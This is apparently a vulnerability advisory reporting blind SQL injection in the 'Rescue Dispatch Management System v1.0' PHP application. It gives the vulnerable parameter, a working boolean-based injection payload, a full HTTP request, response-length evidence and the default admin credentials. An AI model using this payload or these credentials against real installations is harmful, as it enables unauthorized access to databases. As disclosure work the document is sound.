# Rescue Dispatch Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File:  /rdms/admin/incidents/manage_incident.php?id=

Vulnerability location: /rdms/admin/incidents/manage_incident.php?id=,id

[+] Payload: /rdms/admin/incidents/manage_incident.php?id=4%27%20and%20length(database())%20=7--+ // Leak place ---> id

Current database name: rdms_db,length is 7

```sql
GET /rdms/admin/incidents/manage_incident.php?id=4%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close
```

When length (database ()) = 6, Content-Length: 2169
![image](https://user-images.githubusercontent.com/54017627/170463261-7a780334-3c9c-4aa2-89af-d59c3a21a6bb.png)

![image](https://user-images.githubusercontent.com/54017627/170463012-9f9ba7c4-708f-4dd3-a646-cb8af7cdbb70.png)

When length (database ()) = 7, Content-Length: 2208
![image](https://user-images.githubusercontent.com/54017627/170463176-fded7412-ab09-4bfd-9c93-687fbc449a93.png)

![image](https://user-images.githubusercontent.com/54017627/170462969-da4d2369-827f-4a17-a1c3-c73bf560072d.png)
